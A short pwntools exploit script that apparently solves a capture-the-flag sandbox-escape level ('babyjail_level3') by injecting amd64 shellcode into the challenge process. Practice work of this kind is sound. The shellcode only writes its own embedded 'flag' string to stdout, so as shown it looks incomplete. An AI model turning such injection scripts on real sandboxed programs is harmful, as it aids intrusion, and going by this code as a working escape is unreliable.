import pwn

pwn.context.arch = "amd64"
pwn.context.encoding = "latin"

with pwn.process(["/challenge/babyjail_level3", "/"]) as target:
    pwn.info(target.readrepeat(1))


    target.send(pwn.asm(f"""
    lea rsi, [rip+filename]
    mov rax, 1
    mov rdi, 1
    mov rdx, 100
    syscall

    filename:
        .ascii "flag"
    """))

    pwn.info(target.readrepeat(1))
